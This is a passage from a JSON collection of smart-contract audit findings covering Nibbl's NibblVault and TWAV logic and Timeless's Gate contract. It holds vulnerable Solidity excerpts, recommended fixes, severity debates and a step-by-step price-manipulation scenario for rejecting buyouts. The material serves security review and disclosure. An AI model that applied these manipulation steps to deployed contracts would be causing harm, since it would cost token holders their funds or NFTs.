\n> primaryReserveRatio = 200_000 and SCALE = 1_000_000 -- so it seems this applies anytime _initialTokenSupply * _initialTokenPrice < 1_000_000 * 1e18 / 200_000, not just when one of those values is 0. Please correct me if I got that wrong.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/24#issuecomment-1172977395):**\n > This is a good report. I agree this seems like something that should be addressed. Assuming my math is right, if the initialTokenPrice was 1 wei then the initialTokenSupply must be >= 5e18. They are using the default of 18 decimals (which is also industry standard) so that's 5 tokens. Given this is not very large window and these values impact the curve -- without a clear POC High would not be warranted, downgrading to Medium risk.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the NibblVault smart contract. The vulnerability is that there is no sanity check to ensure that the primary reserve ratio multiplied by the initial token supply and the initial token price is greater than or equal to a certain value. As a result, the primary reserve balance is given a value of 0 and the buy and sell functions do not work. The only way to recover the NFT is for the owner of the NFT to call initiateBuyout, but there is a possibility of losing the NFT if someone else also attempts to call initiateBuyout. \n\nThe recommended mitigation steps are to add some sanity checks to ensure a sane expected value for the initial token supply and the initial token price. This is to prevent users from entering wrong values due to lack of awareness.\n\nThe severity of the issue is medium, as it is a loss predicated on certain conditions, but because there is also a lack of sanity check on the minBuyoutTime, it is possible for a seller to lose their NFT immediately.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/24",
      "tags": [],
      "finders": [
        "itsmeSTYJ"
      ]
    },
    {
      "id": "2816",
      "title": "[M-04] Ineffective TWAV Implementation",
      "impact": "MEDIUM",
      "content": "_Submitted by xiaoming90, also found by hyh_\n\nThe current TWAV implementation consists of an array of 4 observations/valuations called `twavObservations`. Whenever, the new valuation is updated, the new cumulative valuation will be appended to the `twavObservations` array and the oldest observation/valuation will be removed from the `twavObservations` array.\n\nDescription of current TWAV implementation can be found at <https://github.com/NibblNFT/nibbl-smartcontracts#twavsol>\n\n> *   Time-weighted average valuation\n> *   Uses an array of length 4 which stores cumulative valuation and timestamp.\n> *   TWAV is calculated between the most and least recent observations recorded in the array.\n> *   TWAV array is updated only when the system is in buyout state. In case of buyout rejection, the array is reset.\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L11>\n\n```solidity\n/// @notice current index of twavObservations index\nuint8 public twavObservationsIndex;\nuint8 private constant TWAV_BLOCK_NUMBERS = 4; //TWAV of last 4 Blocks \nuint32 public lastBlockTimeStamp;\n\n/// @notice record of TWAV \nTwavObservation[TWAV_BLOCK_NUMBERS] public twavObservations;\n\n/// @notice updates twavObservations array\n/// @param _blockTimestamp timestamp of the block\n/// @param _valuation current valuation\nfunction _updateTWAV(uint256 _valuation, uint32 _blockTimestamp) internal {\n    uint32 _timeElapsed; \n    unchecked {\n        _timeElapsed = _blockTimestamp - lastBlockTimeStamp;\n    }\n\n    uint256 _prevCumulativeValuation = twavObservations[((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS].cumulativeValuation;\n    twavObservations[twavObservationsIndex] = TwavObservation(_blockTimestamp, _prevCumulativeValuation + (_valuation * _timeElapsed)); //add the previous observation to make it cumulative\n    twavObservationsIndex = (twavObservationsIndex + 1) % TWAV_BLOCK_NUMBERS;\n    lastBlockTimeStamp = _blockTimestamp;\n}\n```\n\nWithin the `NibblVault` contract, the `_updateTWAV` function will be called whenever the following events happen during the buyout period:\n\n1.  `NibbleVault.buy()` and `NibbleVault.Sell()` functions are called\n2.  `NibbleVault.initiateBuyout` function is called\n3.  `NibbleVault.updateTWAV` function is called\n\nPer the code and comment of `_getTwav()` function, the function will return the TWAV of the last four (4) blocks. This function can be called by anyone.\n\n```solidity\n/// @notice returns the TWAV of the last 4 blocks\n/// @return _twav TWAV of the last 4 blocks\nfunction _getTwav() internal view returns(uint256 _twav){\n    if (twavObservations[TWAV_BLOCK_NUMBERS - 1].timestamp != 0) {\n        uint8 _index = ((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS;\n        TwavObservation memory _twavObservationCurrent = twavObservations[(_index)];\n        TwavObservation memory _twavObservationPrev = twavObservations[(_index + 1) % TWAV_BLOCK_NUMBERS];\n        _twav = (_twavObservationCurrent.cumulativeValuation - _twavObservationPrev.cumulativeValuation) / (_twavObservationCurrent.timestamp - _twavObservationPrev.timestamp);\n    }\n}\n```\n\nTime weighted average valuation (TWAV) is supposed to be the average value of a security over a specified time (e.g. 15 minutes, 1 hour, 24 hours). However, based on the above implementation of the `_getTwav` function, it is not the average value of a security over a specific time.\n\nA user could call the `updateTWAV` function to add the new valuation/observation to the `twavObservations` array each time a new Ethereum block is mined. As such, the current implementation becomes the average value of a security over a specific number of observations (in this case 4 observations), thus it can be considered as Observation weighted average valuation (OWAV).\n\nThere is a fundamental difference between TWAV and OWAV.\n\n### Proof of Concept\n\nIn Ethereum, the average block time is around 15 seconds, so the time to take to mine 4 blocks will be 1 minute. As such, in term of TWAV, the current implementation only have a period of 1 minute, which is too short to prevent price manipulation.\n\nThe following shows an example where it is possible to buy tokensâ†’ increase the valuation above the rejection valuationâ†’ reject the buyoutâ†’ dump the tokens within 1 minute:\n\nAssume that a buyer has triggered a buyout on the vault/NFT, and the buyout rejection price is 120 ETH and the current valuation is 100 ETH. Further assume that all elements in the  `twavObservations` array have already been populated.\n\nNote: Fees are ignored to illustrate the issue.\n\n1.  Block 100 at Time 0 - Attacker called `buy` function to increase the current valuation to 120 ETH attempting to reject the buyout.\n2.  Block 101 at Time 15 - Attacker called `updateTWAV` function. The current valuation (120 ETH) will be replaced the first element in `twavObservations` array.\n3.  Block 102 at Time 30 - Attacker called `updateTWAV` function. The current valuation (120 ETH) will be replaced the second element in `twavObservations` array.\n4.  Block 103 at Time 45 - Attacker called `updateTWAV` function. The current valuation (120 ETH) will be replaced the third element in `twavObservations` array.\n5.  Block 104 at Time 60 - Attacker called `sell` function to sell/dump all his shares. Within the `sell` function, `_updateTWAV` will be first called, thus the current valuation (120 ETH) will be replaced the fourth element in `twavObservations` array. Then, the `_rejectBuyout()` will be called, and the `_getTwav` function will be triggered. At this point, the TWAV valuation is finally 120 ETH, thus the buyout is rejected. Subseqently, attacker's shares are burned, and attacker get back his funds.\n\nSince attacker could perform the above attack within 1 minute, it is very unlikely that the attackers will lose money to arbitrageurs as it takes some time for the arbitrageurs to notice such an opportunity.\n\nAttacker could also front-run or set a higher gas fee to ensure that their transaction get mined in the next block to minimize the attack window period.\n\n### Impact\n\nBuyout can be easily rejected by attackers\n\n### Recommended Mitigation Steps\n\nImplement a proper TWAV that provides the average value of a security over a specified time. The time period/windows of the TWAV must be explicitly defined (e.g. 15 minutes, 1 hour, 24 hours) in the contract.\n\nThere are trade offs when choosing the length of the period of time to calculate a TWAP. Longer periods are better to protect against price manipulation, but come at the expense of a slower, and potentially less accurate, price. Thus, the team should determine the optimal period.\n\nConsider referencing the popular Uniswap V2 TWAP design (<https://docs.uniswap.org/protocol/V2/concepts/core-concepts/oracles>)\n\n**[mundhrakeshav (Nibbl) disagreed with severity](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191)**\n\n**[sseefried (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191#issuecomment-1166158748):**\n > I had a Low Risk ([#142](https://github.com/code-423n4/2022-06-nibbl-findings/issues/142)) associated with `_getTWAV` too. I'm not sure it even averages over 4 observations.\n\n**[Picodes (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191#issuecomment-1166498885):**\n > Some comments, as I personally don't think it's an high security issue:\n> \n>  - the primary goal of the TWAV here is to avoid manipulations within the same block. As long as it's over multiple blocks, the attackers takes a risk as there could be arbitrages, so the attack risk is mitigated.\n>  \n>   - the main assumption of the issue is:  \"it takes some time for the arbitrageurs to notice such an opportunity, and the 4 block window is too short.\" which seems false when you check on chain data: arbitrageurs are frequently super quick to react as it's their primary job: the first to check an opportunity takes it.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191#issuecomment-1173080518):**\n > Great summary @Picodes , I agree with both points.\n> \n> Lowering this to a Medium risk. I may be incorrect, but it seems a secondary goal of Twap is price smoothing to avoid scenarios like what was outlined here. If that's correct then this impacts the function of the protocol and the recommendation is a good consideration.\n\n**[dmitriia (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191#issuecomment-1174456950):**\n > Same here, TWAP is essential to the protocol, while the ability to manipulate the price during last minute breaks the core logic of price discovery by greatly reducing the number of participants. The rationale that 4 blocks are enough and arbitrage is generally quick is sufficient for mainstream cases only, all other trading is at risk of direct manipulation, which is existential risk for the protocol. Can't see why the team pressing for medium here. \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191#issuecomment-1174459120):**\n > > Same here, TWAP is essential to the protocol, while the ability to manipulate the price during last minute breaks the core logic of price discovery by greatly reducing the number of participants. The rationale that 4 blocks are enough and arbitrage is generally quick is sufficient for mainstream cases only, all other trading is at risk of direct manipulation, which is existential risk for the protocol. Can't see why the team pressing for medium here.\n> \n> The stated goal of using Twap in their documentation is the same as above, to prevent same-block attacks. It seems the concern is the implicit behavior expected from using a \"time weighted\" variable. Personally I agree this seems like an area they may want to revisit. However the system behaves correctly and there is a tiny window for bots to respond.\n> \n> @mundhrakeshav @Picodes would you mind elaborating here as well?\n\n**[mundhrakeshav (Nibbl) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191#issuecomment-1174608883):**\n > Yeah, makes sense. We do plan to increase the array length.\n\n**[Picodes (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191#issuecomment-1174707038):**\n > I fully agree with both of you: it'd be indeed better to increase the array length to increase the robustness, but I still feel this is a medium issue as the system works as intended\n\n**[dmitriia (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191#issuecomment-1174787468):**\n > The system formally/technically works as intended, but being a price discovery engine, where participants having incentives to try to determine the NFT price, it will not be used if the window for such a discovery is mere 4 blocks. Formally the bots will have space to react. Realistically it will happen in the most mainstream cases only, when price discovery isn't much needed. I.e. exactly when the system can bring in something new, adding a mechanics for 'slow' usual users to add price information, it will not work as the set of participants who can add the information to the metric (react to move the price) is shrunk by a tiny reaction window. Who will take part in a price discovery game knowing that last minute bots are always can surface? Quite not everyone. This reduces the traction, and so the amount of information brought in by the system, as this is the users who bring in the additional signal, and ultimately it will be a piece of well known NFTs synched with main market with bots, adding no value to it. I.e. the system will work technically, but economically it will not make much sense, so will not be widely used by market actors and can end up provide little value to broad market. This is what I mean by existential risk, which is, of course high. \n> \n> I just feel that here and in general in C4 economic issues are tend to be underestimated, while having one usually tend to be a game changing aspect for a project. \n\n**[IllIllI000 (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191#issuecomment-1174927014):**\n > @HardlyDifficult If the sponsor had used the term OWAV rather than TWAV, would this still be a medium-severity issue? It seems as though they knew the behavior they wanted (at least four user interactions where the average price is above the threshold) and just used the wrong term to describe it. I didn't file this issue because it seemed that way. The screenshot in this issue shows that they're interested in interactions, not duration of time https://github.com/code-423n4/2022-06-nibbl-findings/issues/144. It's possible they confirmed the issue because they weren't aware that comment vs code consistency issues are usually categorized as low risk\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/191#issuecomment-1175170494):**\n > Great points @dmitriia and @IllIllI000 ! Both are compelling. This is certainly a grey area.\n> \n> Given how significantly this impacts how users would potentially view and interact with the system, I'm inclined to leave this a Medium risk instead of downgrading to Low, falling under \"the function of the protocol or its availability could be impacted\".\n> \n> And since this was intentional design and there is a window for bots to respond, I don't feel that High risk is justified.\n> \n> I'm happy to continue here or on Discord, and would love more input if others want to chime in on the severity here. I don't feel strongly but do think that Medium is the best fit here.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the Time Weighted Average Valuation (TWAV) of a security. TWAV is the average value of a security over a specified time (e.g. 15 minutes, 1 hour, 24 hours). However, the current implementation of the TWAV within the NibblVault contract is not the average value of a security over a specific time. Instead, it is an Observation Weighted Average Valuation (OWAV) which is the average value of a security over a specific number of observations (in this case 4 observations). This makes it vulnerable to price manipulation. \n\nAn attacker could call the `updateTWAV` function to add the new valuation/observation to the `twavObservations` array each time a new Ethereum block is mined. As such, the current implementation becomes the average value of a security over a specific number of observations (in this case 4 observations). This could allow attackers to buy tokensâ†’ increase the valuation above the rejection valuationâ†’ reject the buyoutâ†’ dump the tokens within 1 minute. \n\nThe impact of this vulnerability is that buyouts can be easily rejected by attackers. The recommended mitigation steps are to implement a proper TWAV that provides the average value of a security over a specified time. The time period/windows of the TWAV must be explicitly defined (e.g. 15 minutes, 1 hour, 24 hours) in the contract. The team should also consider referencing the popular Uniswap V2 TWAP design.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/191",
      "tags": [
        "TWAP"
      ],
      "finders": [
        "hyh",
        "xiaoming90"
      ]
    },
    {
      "id": "2815",
      "title": "[M-03] User Could Change The State Of The System While In Pause Mode",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L443\n\n\n## Vulnerability details\n\n## Proof-of-Concept\n\nCalling `NibblVault.updateTWAP` function will change the state of the system. It will cause the TWAP to be updated and buyout to be rejected in certain condition.\n\nWhen the system is in `Pause` mode, the system state should be frozen. However, it was possible someone to call the `NibblVault.updateTWAP` function during the `Pause` mode, thus making changes to the system state.\n\n[https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L443](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L443)\n\n```solidity\n/// @notice Updates the TWAV when in buyout\n/// @dev TWAV can be updated only in buyout state\nfunction updateTWAV() external override {\n    require(status == Status.buyout, \"NibblVault: Status!=Buyout\");\n    uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n    if (_blockTimestamp != lastBlockTimeStamp) {\n        _updateTWAV(getCurrentValuation(), _blockTimestamp);   \n        _rejectBuyout(); //For the case when TWAV goes up when updated externally\n    }\n}\n```\n\n## Recommended Mitigation Steps\n\nEnsure that the `NibblVault.updateVault` function cannot be called when the system is in `Pause` mode.\n\nAdd the `whenNotPaused` modifier to the function.\n\n```solidity\n/// @notice Updates the TWAV when in buyout\n/// @dev TWAV can be updated only in buyout state\nfunction updateTWAV() external override whenNotPaused {\n    require(status == Status.buyout, \"NibblVault: Status!=Buyout\");\n    uint32 _blockTimestamp = uint32(block.timestamp % 2**32);\n    if (_blockTimestamp != lastBlockTimeStamp) {\n        _updateTWAV(getCurrentValuation(), _blockTimestamp);   \n        _rejectBuyout(); //For the case when TWAV goes up when updated externally\n    }\n}\n```",
      "summary": "\nThis bug report is about a vulnerability found in the NibblVault.sol smart contract on Github. The vulnerability allows someone to call the `NibblVault.updateTWAP` function during the `Pause` mode, thus making changes to the system state. This should not be possible while the system is paused, as the state should be frozen. To fix this, the `whenNotPaused` modifier should be added to the function, which will ensure that it cannot be called when the system is in `Pause` mode. This will prevent any changes to the system state while the system is paused, thus preventing any potential security risks.",
      "quality_score": 5,
      "rarity_score": 3.5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/200",
      "tags": [
        "Pause"
      ],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "2814",
      "title": "[M-02] Twav.sol#_getTwav() will revert when timestamp > 4294967296",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L35-L42\n\n\n## Vulnerability details\n\n```solidity\nfunction _getTwav() internal view returns(uint256 _twav){\n    if (twavObservations[TWAV_BLOCK_NUMBERS - 1].timestamp != 0) {\n        uint8 _index = ((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS;\n        TwavObservation memory _twavObservationCurrent = twavObservations[(_index)];\n        TwavObservation memory _twavObservationPrev = twavObservations[(_index + 1) % TWAV_BLOCK_NUMBERS];\n        _twav = (_twavObservationCurrent.cumulativeValuation - _twavObservationPrev.cumulativeValuation) / (_twavObservationCurrent.timestamp - _twavObservationPrev.timestamp);\n    }\n}\n```\n\nSince `_blockTimestamp` is `uint32`, subtraction underflow is desired at `_twavObservationCurrent.timestamp - _twavObservationPrev.timestamp`.\n\nSee: https://github.com/Uniswap/v2-periphery/blob/master/contracts/examples/ExampleOracleSimple.sol#L43\n\n```solidity\nfunction update() external {\n    (uint price0Cumulative, uint price1Cumulative, uint32 blockTimestamp) =\n        UniswapV2OracleLibrary.currentCumulativePrices(address(pair));\n    uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n```\n\nBecause the solidity version used by the current implementation is `0.8.10`, and there are some breaking changes in Solidity v0.8.0:\n\n> Arithmetic operations revert on underflow and overflow. \n\nRef: https://docs.soliditylang.org/en/v0.8.13/080-breaking-changes.html#silent-changes-of-the-semantics\n\nThe timestamp subtraction may revert due to underflow.\n\n### Impact\n\nSince `_getTwav()` is used in `NibblVault.sol#_rejectBuyout()`, if it reverts and there is a `buyout`, an essential feature of the `NibblVault` contract will be unavailable, causing users' funds to be frozen in the contract.\n \n### Recommendation\n\nChange to:\n\n```solidity\nfunction _updateTWAV(uint256 _valuation, uint32 _blockTimestamp) internal {\n    uint32 _timeElapsed; \n    unchecked {\n        _timeElapsed = _blockTimestamp - lastBlockTimeStamp;\n    }\n\n    uint256 _prevCumulativeValuation = twavObservations[((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS].cumulativeValuation;\n    unchecked {\n        twavObservations[twavObservationsIndex] = TwavObservation(_blockTimestamp, _prevCumulativeValuation + (_valuation * _timeElapsed)); //add the previous observation to make it cumulative\n    }\n    \n    twavObservationsIndex = (twavObservationsIndex + 1) % TWAV_BLOCK_NUMBERS;\n    lastBlockTimeStamp = _blockTimestamp;\n}\n```\n\n```solidity\nfunction _getTwav() internal view returns(uint256 _twav){\n    if (twavObservations[TWAV_BLOCK_NUMBERS - 1].timestamp != 0) {\n        uint8 _index = ((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS;\n        TwavObservation memory _twavObservationCurrent = twavObservations[(_index)];\n        TwavObservation memory _twavObservationPrev = twavObservations[(_index + 1) % TWAV_BLOCK_NUMBERS];\n        unchecked {\n            _twav = (_twavObservationCurrent.cumulativeValuation - _twavObservationPrev.cumulativeValuation) / (_twavObservationCurrent.timestamp - _twavObservationPrev.timestamp);\n        }\n    }\n}\n```",
      "summary": "\nThis bug report is about a vulnerability in the Twav.sol contract of the 2022-06-nibbl repository on Github. The vulnerability is caused by the subtraction underflow of the `_twavObservationCurrent.timestamp - _twavObservationPrev.timestamp` operation, as the `_blockTimestamp` is `uint32`. The problem is that, due to the Solidity version used (v0.8.10), arithmetic operations revert on underflow and overflow. This means that the timestamp subtraction may revert, making the `_getTwav()` function unavailable and freezing users' funds in the `NibblVault` contract. The recommendation is to change the code to the given code snippets, which will prevent the underflow.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/178",
      "tags": [
        "Denial-Of-Service",
        "Overflow/Underflow",
        "DOS"
      ],
      "finders": [
        "WatchPug",
        "hansfriese  IllIllI"
      ]
    },
    {
      "id": "2813",
      "title": "[M-01] Buyout cannot be rejected when paused",
      "impact": "MEDIUM",
      "content": "_Submitted by Lambda, also found by SmartSek_\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L300>\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L362>\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L464>\n\n<https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L495>\n\n### Impact\n\nWhile `buy()` and `sell()` are only callable when the system is not paused, `redeem()` and `withdrawERC721()` are also callable when it is not. This means that the `BUYOUT_DURATION` is ignored in such cases and it is possible that users are not able to reject certain buyouts.\n\n### Proof of Concept\n\nA user initiates a buyout via `initiateBuyout()`. Just afterwards, the system is stopped. The token holders now cannot buy new tokens to increase the value. However, after two days, the `bidder` can still withdraw the NFT, i.e. there was no way for the users to reject this buyout.\n\n### Recommended Mitigation Steps\n\nIt should be possible to reset the `buyoutEndTime` (to the current `block.timestamp`) when the system is paused such that the token holders always have the possibility to reject a buyout.\n\n**[mundhrakeshav (Nibbl) disputed and commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/55#issuecomment-1166321982):**\n > Expected. When paused no operations should be available.\n\n**[fatherGoose1 (warden) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/55#issuecomment-1166685840):**\n > Strongly disagree with the sponsor's comment. Given that [redeem()](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L464) and [withdrawERC721()](https://github.com/code-423n4/2022-06-nibbl/blob/71b639f977c0351c9928dd3b78eaa4bebb738bc1/contracts/NibblVault.sol#L495) DO NOT contain the `whenNotPaused` modifier, this ensures that pauses that occur during a buyout process will ensure the success of the buyout. The buyout success occurs by time passing a certain block.timestamp and the functionality to claim the NFT and retrieve the underlying are left open even during the pause. \n> \n> Similar to issue [#261](https://github.com/code-423n4/2022-06-nibbl-findings/issues/261)\n> \n> I would agree with the sponsor if all of the `withdraw()/redeem()` functions contained the `whenNotPaused` modifier so that truly all functions were locked during a pause.\n\n**[mundhrakeshav (Nibbl) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/55#issuecomment-1166747212):**\n > Hmmm. Makes sense. We should pause redeem and Withdraw too.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-nibbl-findings/issues/55#issuecomment-1170641593):**\n > The readme does include \"Out of scope: Admin can pause and change certain parameters of the contract.\" however this report is not strictly about the ability to pause.\n> \n> > It should be possible to reset the buyoutEndTime\n> \n> In this scenario, an end time has already been defined. If `pause` is used at that time the window shortens or closes so when resumed the opportunity may have been missed already. The warden's recommendation here, or some variation of it, would provide a way to effectively allow the system to resume from where it left off when originally paused.\n> \n> I suspect the alternative of also pausing redeem / withdraw is not sufficient, as the window to buy/sell will still potentially be passed by the time the system resumes.\n> \n> I agree with the submitted Med risk for this issue since the \"function of the protocol or its availability could be impacted\".\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the NibblVault.sol file, which is part of the code-423n4/2022-06-nibbl project on GitHub. The vulnerability is related to the buyout process, where it is possible for a bidder to withdraw NFTs after two days, even if the system is paused. This means that the BUYOUT_DURATION is ignored and the token holders are not able to reject certain buyouts. To fix the issue, it is recommended to reset the buyoutEndTime when the system is paused so that token holders always have the option to reject a buyout.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Nibbl",
      "source_link": "https://code4rena.com/reports/2022-06-nibbl",
      "github_link": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/55",
      "tags": [],
      "finders": [
        "Lambda",
        "SmartSek"
      ]
    },
    {
      "id": "6772",
      "title": "Accruing yield to msg.sender is not required when minting to xPYT contract",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nGate.sol#L1009\n\n## Description\nThe `the_exit` function always accrues yield to the `msg.sender` before burning new tokens. The idea is to accrue yield for the recipient first before increasing/reducing their balance to not interfere with the yield rewards computation. However, in case `xPYT` is used, tokens are burned on the Gate and not `msg.sender`.\n\n## Recommendation\nFor correctness & potential gas efficiency reasons only accrue the yield of the account whose tokens are being burned. Thatâ€™s `_accrueYield(msg.sender)` in case of `address(xPYT) == address(0)`, and this otherwise.\n\n### Code Changes\n```diff\n// accrue yield\n- _accrueYield(vault, pyt, msg.sender, updatedPricePerVaultShare);\n+ _accrueYield(vault, pyt, address(xPYT) == address(0) ? msg.sender : address(this), updatedPricePerVaultShare);\n```\n\n```solidity\n// burn NYTs and PYTs\nunchecked {\n// Cannot underflow because a user's balance\n// will never be larger than the total supply.\nyieldTokenTotalSupply[vault] -= underlyingAmount;\n}\nnyt.gateBurn(msg.sender, underlyingAmount);\nif (address(xPYT) == address(0)) {\n// burn raw PYT from sender\npyt.gateBurn(msg.sender, underlyingAmount);\n} else {\n/// -----------------------------------------------------------------------\n/// Effects\n/// -----------------------------------------------------------------------\n// convert xPYT to PYT then burn\nxPYT.withdraw(underlyingAmount, address(this), msg.sender);\npyt.gateBurn(address(this), underlyingAmount);\n}\n```\n\nTimeless: `_accrueYield` needs to be called before `yieldTokenTotalSupply[vault] -= underlyingAmount`, so can wrap it in a separate `(address(xPYT) == address(0))` branch. This call accrues yield to `msg.sender`, not `this`, but I guess when the senderâ€™s using `xPYT` we donâ€™t need to accrue yield to the sender since the senderâ€™s PYT balance hasnâ€™t changed.\n\n## Fix Implemented\nImplemented in PR #7.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6771",
      "title": "Constructor function does not check for zero address",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nUniswapV3Juggler.sol#L81-L84\n\n## Description\nThe constructor function does not check if the addresses passed in are zero addresses. This check can guard against errors during deployment of the contract.\n\n## Recommendation\nRequire checks should be added to ensure that the addresses passed into the constructor function are not zero addresses.\n\n```solidity\nconstructor(address factory_, IQuoter quoter_) {\n    require(factory_ != address(0), \"Zero address\");\n    require(quoter_ != address(0), \"Zero address\");\n    factory = factory_;\n    quoter = quoter_;\n}\n```\n\n## Also see:\n- xPYTFactory.sol#L20-L23\n- UniswapV3xPYT.sol#L82-L83\n- UniswapV3Swapper.sol#L70-L74\n- Swapper.sol#L76-L78\n- Factory.sol#L52\n- Gate.sol#L158-L160\n- NegativeYieldToken.sol#L15\n- PerpetualYieldToken.sol#L15\n\n## Timeless\nAcknowledged, weâ€™re fine with this.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6770",
      "title": "Gate.sol gives unlimitted ERC20 approval on pytfor arbitrary address",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity\n**Low Risk**\n\n## Context\n**File:** Gate.sol  \n**Line:** 675\n\n```solidity\nif (address(xPYT) == address(0)) {\n    // mint raw PYT to recipient\n    pyt.gateMint(pytRecipient, yieldAmount);\n} else {\n    // mint PYT and wrap in xPYT\n    pyt.gateMint(address(this), yieldAmount);\n    if (pyt.allowance(address(this), address(xPYT)) < yieldAmount) {\n        // set PYT approval\n        pyt.approve(address(xPYT), type(uint256).max);\n    }\n    xPYT.deposit(yieldAmount, pytRecipient);\n}\n```\n\n## Description\nA malicious contract may be passed into the `claimYieldAndEnter()` function as `xPYT` and given full control over any PYT the contract may ever hold. Even though PYT is validated to be a real PYT contract and the Gate.sol contract isnâ€™t expected to have any PYT in it, it would be safer to remove any unnecessary approvals.\n\n## Recommendation\nAvoid setting any approvals at all by using `gateMint` & `sweep` as `enter` does.\n\n## Timeless\nForgot to use `sweep` for this part. Implemented in PR #5.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6769",
      "title": "Missing check that tokenIn andtokenOut are different",
      "impact": "LOW",
